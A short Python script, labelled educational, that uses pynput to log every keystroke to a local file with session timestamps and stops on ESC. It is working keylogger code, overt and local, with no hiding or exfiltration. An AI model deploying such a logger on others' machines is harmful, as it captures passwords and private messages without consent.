from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

print("🔐 Educational Keylogger Started")
print("🛑 Press ESC to stop logging\n")

# Add session timestamp
with open(LOG_FILE, "a") as f:
    f.write(f"\n\n--- Session started at {datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
